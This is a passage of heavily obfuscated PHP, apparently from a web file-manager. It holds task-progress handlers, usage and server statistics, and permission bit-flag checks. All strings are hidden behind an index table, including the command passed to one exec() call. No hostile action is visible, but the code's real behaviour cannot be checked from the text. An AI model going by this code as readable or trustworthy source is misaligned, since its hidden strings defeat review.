$›’†øùö[$ç˜‡™Û¦[1779]] = $ˆŠâÍ¶™ * 0.3; } else { if ($›’†øùö[$ç˜‡™Û¦[1897]] == $ç˜‡™Û¦[390]) { $ˆŠâÍ¶™ = $›’†øùö[$ç˜‡™Û¦[1778]] / $›’†øùö[$ç˜‡™Û¦[1142]]; $›’†øùö[$ç˜‡™Û¦[1779]] = 0.3 + $ˆŠâÍ¶™ * 0.5; } else { if ($›’†øùö[$ç˜‡™Û¦[1897]] == $ç˜‡™Û¦[110]) { $ˆŠâÍ¶™ = 0; if ($›’†øùö[$ç˜‡™Û¦[1831]]) { $ˆŠâÍ¶™ = $›’†øùö[$ç˜‡™Û¦[1832]] / $›’†øùö[$ç˜‡™Û¦[1831]]; } $›’†øùö[$ç˜‡™Û¦[1779]] = 0.3 + 0.5 + $ˆŠâÍ¶™ * 0.2; } } } if ($›’†øùö[$ç˜‡™Û¦[1779]] > 0) { $ËòœÁ‡Š = timeFloat() - $›’†øùö[$ç˜‡™Û¦[1781]] - $›’†øùö[$ç˜‡™Û¦[1784]]; $›’†øùö[$ç˜‡™Û¦[1785]] = $ËòœÁ‡Š * (1 - $›’†øùö[$ç˜‡™Û¦[1779]]) / $›’†øùö[$ç˜‡™Û¦[1779]]; } } public function copyFileStart($£Ó‹èÜ¯, $µ¡µèÊÕ, $Ú©œ‹Õ•, $¯ŸÄ˜ªÏ, $È†«ê¹², $îşÙ¡‡) { $š¤¹æç¬ =& $_SERVER[ÔÕ±ĞšÎ]; parent::copyFileStart($£Ó‹èÜ¯, $µ¡µèÊÕ, $Ú©œ‹Õ•, $¯ŸÄ˜ªÏ, $È†«ê¹², $îşÙ¡‡); $óûó«œÙ =& $this->task; if ($óûó«œÙ[$š¤¹æç¬[1897]] == $š¤¹æç¬[390]) { $óûó«œÙ[$š¤¹æç¬[1897]] = $š¤¹æç¬[110]; } $this->update(); } public function copyFileEnd($¶êº¦‘—, $ŞçŸÇ´½, $¾Ğ÷¾ ¼, $•‰¢ Œ, $¯ÄÏüÌ©, $æë±÷Èß) { $ØÚ¥„õ =& $_SERVER[ÔÕ±ĞšÎ]; $÷šÕ•¶İ =& $this->task; $÷šÕ•¶İ[$ØÚ¥„õ[1832]] = $÷šÕ•¶İ[$ØÚ¥„õ[1831]]; $÷šÕ•¶İ[$ØÚ¥„õ[1836]] += $÷šÕ•¶İ[$ØÚ¥„õ[1831]]; $÷šÕ•¶İ[$ØÚ¥„õ[1833]] = $ØÚ¥„õ[12]; $this->update(); } public function zipEvent($ã–ÌçÀ, $»Ş³ğÊ, $¾ Í®ç, $ÃâÃ¢îŸ) { $¶£è¶• =& $_SERVER[ÔÕ±ĞšÎ]; $°¯¶¼ç˜ =& $this->task; $°¯¶¼ç˜[$¶£è¶•[1829]] = get_path_this($»Ş³ğÊ); $°¯¶¼ç˜[$¶£è¶•[1831]] = $ÃâÃ¢îŸ; $°¯¶¼ç˜[$¶£è¶•[1832]] = $¾ Í®ç; $°¯¶¼ç˜[$¶£è¶•[1144]] = $ã–ÌçÀ == $¶£è¶•[1905] ? $¶£è¶•[1900] : $¶£è¶•[1901]; $°¯¶¼ç˜[$¶£è¶•[1833]] = $¶£è¶•[12]; $°¯¶¼ç˜[$¶£è¶•[837]] = $ÃâÃ¢îŸ; $°¯¶¼ç˜[$¶£è¶•[1897]] = $¶£è¶•[390]; $this->update(); } public function nameParse($ĞˆñºÃ) { $¨«îíÎ„ =& $_SERVER[ÔÕ±ĞšÎ]; $£ã¤—Ëñ =& $this->task; if ($£ã¤—Ëñ[$¨«îíÎ„[1778]] < $£ã¤—Ëñ[$¨«îíÎ„[1142]]) { $ø·¯‰  = get_path_this($ĞˆñºÃ); if (strstr($ø·¯‰ , $¨«îíÎ„[10])) { $£ã¤—Ëñ[$¨«îíÎ„[1778]] += 1; } } if ($£ã¤—Ëñ[$¨«îíÎ„[1897]] == $¨«îíÎ„[1281]) { $£ã¤—Ëñ[$¨«îíÎ„[1897]] = $¨«îíÎ„[390]; } $£ã¤—Ëñ[$¨«îíÎ„[1829]] = $ĞˆñºÃ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($šÈğì) { $ø„ÂÌâŒ =& $_SERVER[ÔÕ±ĞšÎ]; $ª»ğşÏí = array($ø„ÂÌâŒ[667] => array($ø„ÂÌâŒ[33] => $ø„ÂÌâŒ[1906], $ø„ÂÌâŒ[352] => array($ø„ÂÌâŒ[284], $ø„ÂÌâŒ[839], $ø„ÂÌâŒ[1907], $ø„ÂÌâŒ[1908])), $ø„ÂÌâŒ[1909] => array($ø„ÂÌâŒ[33] => $ø„ÂÌâŒ[1910], $ø„ÂÌâŒ[352] => array($ø„ÂÌâŒ[284], $ø„ÂÌâŒ[837], $ø„ÂÌâŒ[1911], $ø„ÂÌâŒ[1912], $ø„ÂÌâŒ[1913]))); if (!isset($ª»ğşÏí[$šÈğì])) { return !1; } $this->optionType = $ª»ğşÏí[$šÈğì][$ø„ÂÌâŒ[33]]; $this->field = $ª»ğşÏí[$šÈğì][$ø„ÂÌâŒ[352]]; return !0; } public function listData($¢†¼ÛŠ = false, $¢Ïı¬á† = "\x6d\157\x64\151\x66\171\x54\151\155\x65", $Ñ°¡´æ = false) { return parent::listData($¢†¼ÛŠ, $¢Ïı¬á†, $Ñ°¡´æ); } public function trendList($ñå¶å…®) { $‘“ª‹ˆ =& $_SERVER[ÔÕ±ĞšÎ]; $ñàŸ ½® = $this->listData(); if ($ñàŸ ½®) { $¿Ìö’ÏØ = end($ñàŸ ½®); $æü—İŸ = date($‘“ª‹ˆ[1914], strtotime($‘“ª‹ˆ[1915])); if ($¿Ìö’ÏØ[$‘“ª‹ˆ[284]] == $æü—İŸ) { return $ñàŸ ½®; } $–ÖÀÈ£ü = strtotime($¿Ìö’ÏØ[$‘“ª‹ˆ[284]]); } if (!isset($–ÖÀÈ£ü)) { $ÜŸäœÍÚ = $ñå¶å…® == $‘“ª‹ˆ[667] ? $‘“ª‹ˆ[599] : $‘“ª‹ˆ[899]; $–ÖÀÈ£ü = Model($ÜŸäœÍÚ)->min($‘“ª‹ˆ[233]); } $úÅ«å“ = $‘“ª‹ˆ[1916] . ucfirst($ñå¶å…®); $õå¶âÑé = $this->dateList($–ÖÀÈ£ü); foreach ($õå¶âÑé as $æü—İŸ) { $this->{$úÅ«å“}($æü—İŸ); } return $this->listData(); } private function dateList($îşç‘§×) { $ç¾§ùï =& $_SERVER[ÔÕ±ĞšÎ]; $ÊÓ¨’ = $îşç‘§×; $³õßÈ” = strtotime($ç¾§ùï[1915]); $§Ñà³Ä = array(); while ($ÊÓ¨’ <= $³õßÈ”) { $§Ñà³Ä[] = date($ç¾§ùï[1914], $ÊÓ¨’); $ÊÓ¨’ = strtotime($ç¾§ùï[1917], $ÊÓ¨’); } return $§Ñà³Ä; } public function _recordUser($–ëÛí„á = '') { $…¿âŞ—í =& $_SERVER[ÔÕ±ĞšÎ]; $İ¥Ú¤ß = strtotime(date($…¿âŞ—í[1918], strtotime($–ëÛí„á))); $†¬ĞúÒ = strtotime(date($…¿âŞ—í[1919], strtotime($–ëÛí„á))); $ù˜˜Ê¥Õ = array($…¿âŞ—í[233] => array($…¿âŞ—í[1092], $†¬ĞúÒ)); $İôÍƒ›‚ = Model($…¿âŞ—í[599])->where($ù˜˜Ê¥Õ)->count($…¿âŞ—í[1777]); $ù˜˜Ê¥Õ[$…¿âŞ—í[233]] = array($…¿âŞ—í[410], array($İ¥Ú¤ß, $†¬ĞúÒ)); $øáƒŞÑ = Model($…¿âŞ—í[599])->where($ù˜˜Ê¥Õ)->count($…¿âŞ—í[1777]); $ù˜˜Ê¥Õ[$…¿âŞ—í[33]] = $…¿âŞ—í[1920]; $öä¸íªƒ = Model($…¿âŞ—í[1921])->where($ù˜˜Ê¥Õ)->count($…¿âŞ—í[1922]); $É½áĞ½ = array($…¿âŞ—í[284] => $–ëÛí„á, $…¿âŞ—í[839] => (int) $İôÍƒ›‚, $…¿âŞ—í[1907] => (int) $øáƒŞÑ, $…¿âŞ—í[1908] => (int) $öä¸íªƒ); return $this->insert($É½áĞ½); } public function _recordStore($Ş‚õÀÑÊ = '') { $çêËÒ¥Ğ =& $_SERVER[ÔÕ±ĞšÎ]; $ŠÒ×àş = strtotime(date($çêËÒ¥Ğ[1919], strtotime($Ş‚õÀÑÊ))); $¬¦‹©­‡ = array($çêËÒ¥Ğ[233] => array($çêËÒ¥Ğ[1092], $ŠÒ×àş)); $ıü×¤¯º = Model($çêËÒ¥Ğ[546])->where($¬¦‹©­‡)->sum($çêËÒ¥Ğ[79]); $¬¦‹©­‡[$çêËÒ¥Ğ[487]] = 0; $Ù¸·² = Model($çêËÒ¥Ğ[899])->where($¬¦‹©­‡)->sum($çêËÒ¥Ğ[79]); $¬¦‹©­‡[$çêËÒ¥Ğ[190]] = 1; $‚ÁÔ˜ú = Model($çêËÒ¥Ğ[899])->where($¬¦‹©­‡)->sum($çêËÒ¥Ğ[79]); $¬¦‹©­‡[$çêËÒ¥Ğ[190]] = 2; $÷áØÇ‰ñ = Model($çêËÒ¥Ğ[899])->where($¬¦‹©­‡)->sum($çêËÒ¥Ğ[79]); $»¹Ã»÷¨ = array($çêËÒ¥Ğ[284] => $Ş‚õÀÑÊ, $çêËÒ¥Ğ[837] => (int) $Ù¸·², $çêËÒ¥Ğ[1911] => (int) $ıü×¤¯º, $çêËÒ¥Ğ[1912] => (int) $‚ÁÔ˜ú, $çêËÒ¥Ğ[1913] => (int) $÷áØÇ‰ñ); return $this->insert($»¹Ã»÷¨); } public function trend($ÛĞù“‹Š, $Á¸’ˆ¦) { $¨±—Ãú­ =& $_SERVER[ÔÕ±ĞšÎ]; if (!$this->init($ÛĞù“‹Š)) { return !1; } $˜ãùƒ = $this->trendList($ÛĞù“‹Š); if ($˜ãùƒ && $Á¸’ˆ¦ != $¨±—Ãú­[1749]) { $šÈ¤÷ã = $˜ãùƒ[0][$¨±—Ãú­[284]]; $ÌÌ»³æ§ = $this->validDate($Á¸’ˆ¦, $šÈ¤÷ã); $Ÿ«‘á = array(); $“€ ±•ú = array_to_keyvalue($˜ãùƒ, $¨±—Ãú­[284]); foreach ($ÌÌ»³æ§ as $ÀÓ£û×) { if (isset($“€ ±•ú[$ÀÓ£û×])) { $äË„üáì = $“€ ±•ú[$ÀÓ£û×]; } else { $äË„üáì = end($˜ãùƒ); $äË„üáì[$¨±—Ãú­[284]] = $ÀÓ£û×; if ($ÛĞù“‹Š == $¨±—Ãú­[667]) { $äË„üáì[$¨±—Ãú­[1907]] = $äË„üáì[$¨±—Ãú­[1908]] = 0; } } $Ÿ«‘á[] = $äË„üáì; } $˜ãùƒ = $Ÿ«‘á; } $ÍÜ–±æñ = array($¨±—Ãú­[667] => array($¨±—Ãú­[839] => LNG($¨±—Ãú­[1923]), $¨±—Ãú­[1907] => LNG($¨±—Ãú­[1924]), $¨±—Ãú­[1908] => LNG($¨±—Ãú­[1925])), $¨±—Ãú­[1909] => array($¨±—Ãú­[837] => LNG($¨±—Ãú­[1926]), $¨±—Ãú­[1911] => LNG($¨±—Ãú­[1927]), $¨±—Ãú­[1912] => LNG($¨±—Ãú­[1928]), $¨±—Ãú­[1913] => LNG($¨±—Ãú­[1929]))); $Ëƒ®âí = array($¨±—Ãú­[667] => $¨±—Ãú­[1930], $¨±—Ãú­[1909] => $¨±—Ãú­[79]); if (empty($˜ãùƒ)) { $ÀÓ£û× = date($¨±—Ãú­[1914], strtotime($¨±—Ãú­[1915])); $êê£ãÒ‰ = array($¨±—Ãú­[284] => $ÀÓ£û×); foreach ($ÍÜ–±æñ[$ÛĞù“‹Š] as $ÍÙÕé™… => $ß¶ÃÄÓì) { $êê£ãÒ‰[$ÍÙÕé™…] = 0; } $˜ãùƒ[] = $êê£ãÒ‰; } $ş»ñ­é = array(); foreach ($˜ãùƒ as $ß¶ÃÄÓì) { if ($ÛĞù“‹Š == $¨±—Ãú­[1909] && $ß¶ÃÄÓì[$¨±—Ãú­[1911]] > $ß¶ÃÄÓì[$¨±—Ãú­[837]]) { $ß¶ÃÄÓì[$¨±—Ãú­[1911]] = $ß¶ÃÄÓì[$¨±—Ãú­[837]]; } foreach ($ÍÜ–±æñ[$ÛĞù“‹Š] as $ÍÙÕé™… => $†Á¾Ü•) { $äË„üáì = array($¨±—Ãú­[284] => $ß¶ÃÄÓì[$¨±—Ãú­[284]], $¨±—Ãú­[1665] => $†Á¾Ü•); $äË„üáì[$Ëƒ®âí[$ÛĞù“‹Š]] = isset($ß¶ÃÄÓì[$ÍÙÕé™…]) ? $ß¶ÃÄÓì[$ÍÙÕé™…] : 0; $ş»ñ­é[] = $äË„üáì; } } return $ş»ñ­é; } public function validDate($ôŸƒ“˜°, $äˆĞîˆº) { $Çä¹ì× =& $_SERVER[ÔÕ±ĞšÎ]; $Ô’ŸÔ· = date($Çä¹ì×[1914], strtotime($Çä¹ì×[1915])); $¦×±¥â = array($Ô’ŸÔ·); switch ($ôŸƒ“˜°) { case $Çä¹ì×[1756]: $Ğ±ĞÄª = mktime(0, 0, 0, date($Çä¹ì×[1931]), date($Çä¹ì×[1454]) - date($Çä¹ì×[1544]) + 7 - 7, date($Çä¹ì×[1932])); $áÖêù¹¶ = 0; do { $Œå¿¹æ² = date($Çä¹ì×[1914], $Ğ±ĞÄª - 3600 * 24 * 7 * $áÖêù¹¶); $¦×±¥â[] = $Œå¿¹æ²; $áÖêù¹¶++; } while ($äˆĞîˆº < $Œå¿¹æ²); break; case $Çä¹ì×[1754]: $áÖêù¹¶ = 1; do { $¼»å ‚® = date($Çä¹ì×[1933], strtotime("\x2d\40{$áÖêù¹¶}\x20\x6d\x6f\156\164\150\163")); $¦×±¥â[] = $¼»å ‚®; $áÖêù¹¶++; } while ($äˆĞîˆº < $¼»å ‚®); break; case $Çä¹ì×[1934]: $¾àÂÀ²Ä = (int) date($Çä¹ì×[1932], strtotime($äˆĞîˆº)); $»ä‚Ô­ = (int) date($Çä¹ì×[1932]); if ($¾àÂÀ²Ä >= $»ä‚Ô­) { break; } for ($¾àÂÀ²Ä; $¾àÂÀ²Ä < $»ä‚Ô­; $¾àÂÀ²Ä++) { $¦×±¥â[] = $¾àÂÀ²Ä . $Çä¹ì×[1935]; } break; default: break; } if ($äˆĞîˆº > end($¦×±¥â)) { array_pop($¦×±¥â); } sort($¦×±¥â); return $¦×±¥â; } public function listTable($ÒÓ‡ÉÅœ) { $³´’ÀÀÜ = ucfirst($ÒÓ‡ÉÅœ); return Model($³´’ÀÀÜ)->listData(); } public function option($ÒÀ÷ƒû£) { $˜â›Ş¸û = $_SERVER[ÔÕ±ĞšÎ][1936] . ucfirst($ÒÀ÷ƒû£); return $this->{$˜â›Ş¸û}(); } private function optionUser() { $ãıÊ¬æ‰ =& $_SERVER[ÔÕ±ĞšÎ]; $àÉ²ÒÍ = Model($ãıÊ¬æ‰[599])->count($ãıÊ¬æ‰[1777]); $ÏÑší¢ = Model($ãıÊ¬æ‰[599])->where($ãıÊ¬æ‰[1937])->count($ãıÊ¬æ‰[1777]); $¼’»ÈÆ = intval($GLOBALS[$ãıÊ¬æ‰[6]][$ãıÊ¬æ‰[426]][$ãıÊ¬æ‰[1722]]) / 3600; $¬¼…ÆºÇ = strtotime("\55{$¼’»ÈÆ}\40\x68\x6f\165\162\163"); $ğ’ï³ß = strtotime(date($ãıÊ¬æ‰[1918])); if ($¬¼…ÆºÇ < $ğ’ï³ß) { $¬¼…ÆºÇ = $ğ’ï³ß; } $í•ÌáÁõ = array($ãıÊ¬æ‰[1938] => array($ãıÊ¬æ‰[1093], $¬¼…ÆºÇ)); $«•óÑ¦ç = (int) Model($ãıÊ¬æ‰[599])->where($í•ÌáÁõ)->count($ãıÊ¬æ‰[1777]); if (!$«•óÑ¦ç) { $«•óÑ¦ç = 1; } $í•ÌáÁõ = array($ãıÊ¬æ‰[1938] => array($ãıÊ¬æ‰[1093], $ğ’ï³ß)); $”á¿°ù = Model($ãıÊ¬æ‰[599])->where($í•ÌáÁõ)->count($ãıÊ¬æ‰[1777]); return array($ãıÊ¬æ‰[832] => (int) $àÉ²ÒÍ, $ãıÊ¬æ‰[1939] => (int) ($àÉ²ÒÍ - $ÏÑší¢), $ãıÊ¬æ‰[1940] => (int) $ÏÑší¢, $ãıÊ¬æ‰[1941] => (int) $”á¿°ù, $ãıÊ¬æ‰[1942] => $«•óÑ¦ç); } private function optionFile() { $õ ºô„Ä =& $_SERVER[ÔÕ±ĞšÎ]; $±š“ô¨ = $this->sourceSize(); $ú‹Ø½“¸ = $±š“ô¨[$õ ºô„Ä[79]]; $‘³†›õ¿ = $±š“ô¨[$õ ºô„Ä[1911]]; $ËãÀş©æ = Model($õ ºô„Ä[899])->where(array($õ ºô„Ä[487] => 0))->count($õ ºô„Ä[193]); $¢Ë÷•Êá = array($õ ºô„Ä[487] => 0, $õ ºô„Ä[233] => array($õ ºô„Ä[1093], strtotime(date($õ ºô„Ä[1918])))); $¥¥Ü›µ„ = Model($õ ºô„Ä[899])->where($¢Ë÷•Êá)->sum($õ ºô„Ä[79]); $Æ¿´÷ôÅ = Model($õ ºô„Ä[899])->where($¢Ë÷•Êá)->count($õ ºô„Ä[193]); return array($õ ºô„Ä[837] => $ú‹Ø½“¸, $õ ºô„Ä[1911] => $‘³†›õ¿, $õ ºô„Ä[1943] => $ú‹Ø½“¸ - $‘³†›õ¿, $õ ºô„Ä[1944] => (int) $¥¥Ü›µ„, $õ ºô„Ä[839] => (int) $ËãÀş©æ, $õ ºô„Ä[1945] => (int) $Æ¿´÷ôÅ); } private function optionAccess() { $ö¾ÇìŞ =& $_SERVER[ÔÕ±ĞšÎ]; return array($ö¾ÇìŞ[832] => $this->typeLogCnt(), $ö¾ÇìŞ[110] => $this->typeLogCnt($ö¾ÇìŞ[110]), $ö¾ÇìŞ[527] => $this->typeLogCnt($ö¾ÇìŞ[527]), $ö¾ÇìŞ[1946] => $this->typeLogCnt($ö¾ÇìŞ[1946]), $ö¾ÇìŞ[1947] => $this->typeLogCnt($ö¾ÇìŞ[1947]), $ö¾ÇìŞ[667] => $this->typeLogCnt($ö¾ÇìŞ[12], $ö¾ÇìŞ[1922])); } private function typeLogCnt($Ü¥“¨Í = '', $‚ÔŞ”­± = "\151\144") { $ŸÆŠ«Üù =& $_SERVER[ÔÕ±ĞšÎ]; $°Ï·†à² = array($ŸÆŠ«Üù[110] => array($ŸÆŠ«Üù[1948], $ŸÆŠ«Üù[1949]), $ŸÆŠ«Üù[527] => array($ŸÆŠ«Üù[1950], $ŸÆŠ«Üù[1951]), $ŸÆŠ«Üù[1946] => array($ŸÆŠ«Üù[1952], $ŸÆŠ«Üù[1953], $ŸÆŠ«Üù[1954]), $ŸÆŠ«Üù[1947] => array($ŸÆŠ«Üù[1955], $ŸÆŠ«Üù[1956]), $ŸÆŠ«Üù[1957] => array($ŸÆŠ«Üù[1958], $ŸÆŠ«Üù[1959], $ŸÆŠ«Üù[1960])); $ŒÂ¦ÒÇ = strtotime(date($ŸÆŠ«Üù[1918])); $†Í´€—¦ = array($ŸÆŠ«Üù[233] => array($ŸÆŠ«Üù[1093], $ŒÂ¦ÒÇ)); if ($Ü¥“¨Í) { $†Í´€—¦[$ŸÆŠ«Üù[33]] = array($ŸÆŠ«Üù[7], $°Ï·†à²[$Ü¥“¨Í]); } $À„‰‘‰ò = Model($ŸÆŠ«Üù[1921])->where($†Í´€—¦)->count($‚ÔŞ”­±); return (int) $À„‰‘‰ò; } private function optionServer() { $¹äöóÚÈ =& $_SERVER[ÔÕ±ĞšÎ]; $¯·¾â¤‘ = $this->diskDriver(); $¤¬ÅôÀÄ = KodIO::defaultDriver(); $°ùè˜—€ = array($¹äöóÚÈ[892] => $¤¬ÅôÀÄ[$¹äöóÚÈ[477]]); $ú ¶Íí = Model($¹äöóÚÈ[546])->where($°ùè˜—€)->sum($¹äöóÚÈ[79]); $±ÚÄ”À = explode($¹äöóÚÈ[53], $_SERVER[$¹äöóÚÈ[147]]); $åÜ†“â€ = $±ÚÄ”À[0]; $¬ñîïÑË = $GLOBALS[$¹äöóÚÈ[6]][$¹äöóÚÈ[21]]; $„è‰©Éé = $¬ñîïÑË[$¹äöóÚÈ[1055]]; if ($„è‰©Éé == $¹äöóÚÈ[1043]) { $¥Š¢ú÷¿ = explode($¹äöóÚÈ[1370], $¬ñîïÑË[$¹äöóÚÈ[1054]]); $„è‰©Éé = $¥Š¢ú÷¿[0]; } if ($„è‰©Éé == $¹äöóÚÈ[991] || $„è‰©Éé == $¹äöóÚÈ[879]) { $±Àïğ¨Š = Model()->db()->query($¹äöóÚÈ[1961]); $¡ÑôŠû‹ = $±Àïğ¨Š[0] && isset($±Àïğ¨Š[0][$¹äöóÚÈ[1664]]) ? $±Àïğ¨Š[0][$¹äöóÚÈ[1664]] : 0; $„è‰©Éé = $¹äöóÚÈ[1962] . ($¡ÑôŠû‹ ? $¹äöóÚÈ[8] . $¡ÑôŠû‹ : $¹äöóÚÈ[12]); } $Ëî¬ËáÖ = $GLOBALS[$¹äöóÚÈ[6]][$¹äöóÚÈ[426]][$¹äöóÚÈ[901]]; return array($¹äöóÚÈ[1963] => $¯·¾â¤‘ ? $¯·¾â¤‘[$¹äöóÚÈ[1964]] : 0, $¹äöóÚÈ[1965] => $¯·¾â¤‘ ? $¯·¾â¤‘[$¹äöóÚÈ[1966]] : 0, $¹äöóÚÈ[1967] => (int) $¤¬ÅôÀÄ[$¹äöóÚÈ[1964]] * 1024 * 1024 * 1024, $¹äöóÚÈ[1968] => (int) $ú ¶Íí, $¹äöóÚÈ[1969] => ucfirst($åÜ†“â€), $¹äöóÚÈ[1970] => $¹äöóÚÈ[1971] . PHP_VERSION, $¹äöóÚÈ[1972] => phpBuild64() ? 64 : 32, $¹äöóÚÈ[831] => str_replace($¹äöóÚÈ[1211], $¹äöóÚÈ[1071], $„è‰©Éé), $¹äöóÚÈ[426] => ucfirst($Ëî¬ËáÖ), $¹äöóÚÈ[32] => $_SERVER[$¹äöóÚÈ[1973]]); } private function diskDriver() { $ê¨é•”ş =& $_SERVER[ÔÕ±ĞšÎ]; $•ÌÎÑæ = $ê¨é•”ş[8]; $àÔ×ÜÔ´ = $GLOBALS[$ê¨é•”ş[6]][$ê¨é•”ş[1387]] == $ê¨é•”ş[1388]; if ($àÔ×ÜÔ´) { $•ÌÎÑæ = $ê¨é•”ş[1974]; if (function_exists($ê¨é•”ş[1975])) { exec($ê¨é•”ş[1976], $íùßĞÁÚ); $•ÌÎÑæ = $íùßĞÁÚ[1] . $ê¨é•”ş[8]; } } if (!file_exists($•ÌÎÑæ)) { return; } if (!function_exists($ê¨é•”ş[1977])) { return; } $øÉ‹¹¦î = @disk_total_space($•ÌÎÑæ); $×¦åÌåº = $øÉ‹¹¦î - @disk_free_space($•ÌÎÑæ); return array($ê¨é•”ş[1964] => $øÉ‹¹¦î, $ê¨é•”ş[1966] => $×¦åÌåº); } public function fileChart($‘†õñáä) { $¼ÇÅÈ–» =& $_SERVER[ÔÕ±ĞšÎ]; if (isset($‘†õñáä[$¼ÇÅÈ–»[1777]])) { return Model($¼ÇÅÈ–»[899])->userFileTypeProfile($‘†õñáä[$¼ÇÅÈ–»[1777]]); } if (isset($‘†õñáä[$¼ÇÅÈ–»[1978]])) { return Model($¼ÇÅÈ–»[899])->groupFileTypeProfile($‘†õñáä[$¼ÇÅÈ–»[1978]]); } $›²”êñğ = $this->sourceSize(); $å›Ø„…Â = array($¼ÇÅÈ–»[192] => 0, $¼ÇÅÈ–»[190] => 1); $ë‰ĞÎã® = Model($¼ÇÅÈ–»[899])->where($å›Ø„…Â)->sum($¼ÇÅÈ–»[79]); $å›Ø„…Â[$¼ÇÅÈ–»[190]] = 2; $Ä•½´ÓÛ = Model($¼ÇÅÈ–»[899])->where($å›Ø„…Â)->sum($¼ÇÅÈ–»[79]); return array($¼ÇÅÈ–»[837] => $›²”êñğ[$¼ÇÅÈ–»[79]], $¼ÇÅÈ–»[1911] => $›²”êñğ[$¼ÇÅÈ–»[1911]], $¼ÇÅÈ–»[1912] => (int) $ë‰ĞÎã®, $¼ÇÅÈ–»[1913] => (int) $Ä•½´ÓÛ); } private function sourceSize() { $ºü¾ùÒ­ =& $_SERVER[ÔÕ±ĞšÎ]; $ãÑ¦±ê² = Model($ºü¾ùÒ­[899])->where(array($ºü¾ùÒ­[487] => 0))->sum($ºü¾ùÒ­[79]); $²£ïÀÇà = Model($ºü¾ùÒ­[546])->sum($ºü¾ùÒ­[79]); if ($²£ïÀÇà > $ãÑ¦±ê²) { $²£ïÀÇà = $ãÑ¦±ê²; } return array($ºü¾ùÒ­[79] => (int) $ãÑ¦±ê², $ºü¾ùÒ­[1911] => (int) $²£ïÀÇà); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ƒ•³®º‚ =& $_SERVER[ÔÕ±ĞšÎ]; $§‘ûä = array(array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1979]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1981], $ƒ•³®º‚[1982] => 1, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1985]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1986], $ƒ•³®º‚[1982] => 2, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1987]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1988], $ƒ•³®º‚[1982] => 3, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1989]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1990], $ƒ•³®º‚[1982] => 4, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_VIEW), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1991]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1992], $ƒ•³®º‚[1982] => 5, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1993]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1994], $ƒ•³®º‚[1982] => 6, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ƒ•³®º‚[496] => LNG($ƒ•³®º‚[1995]), $ƒ•³®º‚[1980] => $ƒ•³®º‚[1996], $ƒ•³®º‚[1982] => 7, $ƒ•³®º‚[1983] => 1, $ƒ•³®º‚[1984] => 0)); return $§‘ûä; } public static function authCheck($Ê—ªßó¨, $ñ˜„”Å) { $Û¥µı½à =& $_SERVER[ÔÕ±ĞšÎ]; $Ê—ªßó¨ = intval($Ê—ªßó¨); if (KodUser::isRoot() && $GLOBALS[$Û¥µı½à[6]][$Û¥µı½à[1997]]) { return !0; } if ($Ê—ªßó¨ <= 0) { return !1; } if (($Ê—ªßó¨ & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($Ê—ªßó¨ & $ñ˜„”Å); } public static function authCheckShow($ÔöÆä¤Á) { return self::authCheck($ÔöÆä¤Á, self::AUTH_SHOW); } public static function authCheckView($Ûùê¼½ù) { return self::authCheck($Ûùê¼½ù, self::AUTH_VIEW); } public static function authCheckDownload($„àäçØü) { return self::authCheck($„àäçØü, self::AUTH_DOWNLOAD); } public static function authCheckUpload($½ıÛäÚ) { return self::authCheck($½ıÛäÚ, self::AUTH_UPLOAD); } public static function authCheckEdit($ª²±ñú) { return self::authCheck($ª²±ñú, self::AUTH_EDIT); } public static function authCheckRemove($Ñ…‡Ø) { return self::authCheck($Ñ…‡Ø, self::AUTH_REMOVE); } public static function authCheckShare($Ÿø¼Æ¤‡) { return self::authCheck($Ÿø¼Æ¤‡, self::AUTH_SHARE); } public static function authCheckComment($¥Ñ¡¯ºï) { return self::authCheck($¥Ñ¡¯ºï, self::AUTH_COMMENT); } public static function authCheckEvent($Ğ ÖŒúö) { return self::authCheck($Ğ ÖŒúö, self::AUTH_EVENT); } public static function authCheckRoot($²à¥Ç¾Á) { return self::authCheck($²à¥Ç¾Á, self::AUTH_ROOT); } public static function authCheckAction($Õ¾”¼ã, $Ø»´¬Àì) { 